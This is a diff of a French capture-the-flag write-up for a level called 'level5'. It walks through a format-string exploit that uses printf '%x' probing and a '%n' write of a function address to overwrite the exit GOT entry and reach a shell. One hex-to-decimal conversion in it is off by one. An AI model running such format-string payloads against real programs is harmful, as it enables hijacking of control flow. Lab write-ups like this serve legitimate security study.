@@ -1,6 +1,6 @@
 # leUVeL cInQ
 
-- On cherche l'adresse du exit afin de l'override pour appeler la fonction o. Car c'est la seule fonction qui n'a pas d'utilité au programme et qui ne quitera pas la programme.
+- On cherche l'adresse du exit afin de l'overwrite pour appeler la fonction o. Car c'est la seule fonction qui n'a pas d'utilité au programme et qui ne quitera pas la programme.
 
 <pre>
 $> objdump -R ./level5
@@ -21,14 +21,14 @@ OFFSET   TYPE              VALUE
 
 - (hex)0x08049838 = (little indian)\\x38\\x98\\x04\\x08
 
-- Comme pour l'exercice precedent nous cherchons la place de l'adresse de la fonction `o` grace au printf.
+- Comme pour l'exercice precedent nous cherchons la place de l'adresse passer en argument. Afin d'y ecrire plus tard se qu'on veut
 
 <pre>
 $> python -c "print('AAAA' + '\x38\x98\x04\x08' + '%x ' * 5)" | ./level5
 AAAA8200 b7fd1ac0 b7ff37d0 <strong>41414141 8049838</strong>
 </pre>
 
-- Afin de pouvoir override l'appel à exit nous devons recuperer l'adresse de la fonction o.
+- Afin de pouvoir overwrite l'appel à exit nous devons recuperer l'adresse de la fonction o.
 
 <pre>
 $> gdb ./level5
@@ -45,7 +45,7 @@ End of assembler dump.
 </pre>
 - (hex)0x080484a5 = (dec)134513828
 
-- Comme pour l'exercice precedent nous avons l'adresse de la fonction à override et en plus l'adresse de la fonction o sous forme de decimal.
+- Il faut maintenant utiliser le %n pour ecrire par dessus exit
 
 <pre>
 $> (python -c "print('AAAA' + '\x38\x98\x04\x08' + '%134513820d' + '%5\$n')"; cat) | ./level5 | tr -d ' '
